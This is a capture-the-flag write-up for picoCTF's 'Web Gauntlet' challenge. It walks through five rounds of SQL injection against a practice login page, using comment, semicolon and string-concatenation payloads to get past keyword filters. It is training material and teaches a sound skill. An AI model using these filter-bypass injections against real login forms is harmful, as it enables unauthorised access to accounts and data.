# Web Gauntlet

- [Challenge information](#challenge-information)
- [Solution](#solution)
- [References](#references)

## Challenge information
```
Points: 200
Tags: picoCTF 2020 Mini-Competition, Web Exploitation
Author: MADSTACKS

Description:
Can you beat the filters? 
Log in as admin 
http://jupiter.challenges.picoctf.org:9683/ 
http://jupiter.challenges.picoctf.org:9683/filter.php

Hints:
1. You are not allowed to login with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters it may be hard to see the characters, 
   always (always) look at the raw hex in the response.
4. sqlite
5. If your cookie keeps getting reset, try using a private browser window
```
Challenge link: [https://play.picoctf.org/practice/challenge/88](https://play.picoctf.org/practice/challenge/88)

## Solution

Browsing to the site we see a login page with the heading `Round 1 / 5` and a Username field, a Password field and a `Sign In`-button.

The challenge description has already told us to expect [SQL injections](https://en.wikipedia.org/wiki/SQL_injection).

### Do a test login

To get more information I first tried to login with  
Username: `admin`  
Password: `admin123`

The following SQL statement was printed:  
`SELECT * FROM users WHERE username='admin' AND password='admin123'`

Checking `http://jupiter.challenges.picoctf.org:9683/filter.php` showed  
`Round1: or`  
So I guess any `OR`-statements are filtered out.

### Round 1 of 5

I used the comment `--` to effectivly comment out the rest of the `SELECT`-statement.

Logging in with  
Username: `admin' --`  
Password: `whatever`  
returned the message `Congrats! On to round 2`.

Re-checking `http://jupiter.challenges.picoctf.org:9683/filter.php` showed  
`Round2: or and like = --`
So we cannot use `--` comments any more. Neither `OR`, `AND`, `LIKE` nor `=`.

Let's use a `/* this is a multi-line comment */` [SQL comment](https://www.w3schools.com/sql/sql_comments.asp) instead.

### Round 2 of 5

Logging in with  
Username: `admin'/*`  
Password: `whatever`  
returned the message `Congrats! On to round 3`.

The following SQL statement was also printed:  
`SELECT * FROM users WHERE username='admin'/*' AND password='whatever'`

Re-checking `http://jupiter.challenges.picoctf.org:9683/filter.php` showed  
`Round3: or and = like > < --`

It's impossible to see in a regular browser (use hex-output in Burp instead), but the space character is also included in the list of filters.

### Round 3 of 5

The above expression also works here but let's choose another one, one with the `;` character that ends SQL-statements.

Logging in with  
Username: `admin';`  
Password: `whatever`  
returned the message `Congrats! On to round 4`.

The following SQL statement was also printed:  
`SELECT * FROM users WHERE username='admin';' AND password='whatever'`

Re-checking `http://jupiter.challenges.picoctf.org:9683/filter.php` showed  
`Round4: or and = like > < -- admin`

As before the space character is also included in the list of filters.

### Round 4 of 5

We cannot use the string `admin` any more. But we can use concatenation (`||`), as in one of the following combinations:
 * a'||'dmin'
 * ad'||'min'
 * adm'||'in'
 * admi'||'n'

I chose the last one.

Logging in with  
Username: `admi'||'n';`  
Password: `whatever`  
returned the message `Congrats! On to round 5`.

The following SQL statement was also printed:  
`SELECT * FROM users WHERE username='admi'||'n';' AND password='whatever'`

Re-checking `http://jupiter.challenges.picoctf.org:9683/filter.php` showed  
`Round5: or and = like > < -- union admin`

As before the space character is also included in the list of filters.

### Round 5 of 5

We can re-use the same credentials as in round 4 to get the message:  
`Congrats! You won! Check out filter.php`

### Get the flag

Access `http://jupiter.challenges.picoctf.org:9683/filter.php` a final time to get the PHP source code with the flag as a comment at the end.

For additional information, please see the references below.

## References

- [Burp suite - Homepage](https://portswigger.net/burp)
- [PortSwigger - SQL Injection: Bypassing Common Filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)
- [W3Schools - SQL Comments](https://www.w3schools.com/sql/sql_comments.asp)
- [Wikipedia - SQL](https://en.wikipedia.org/wiki/SQL)
- [Wikipedia - SQL injection](https://en.wikipedia.org/wiki/SQL_injection)
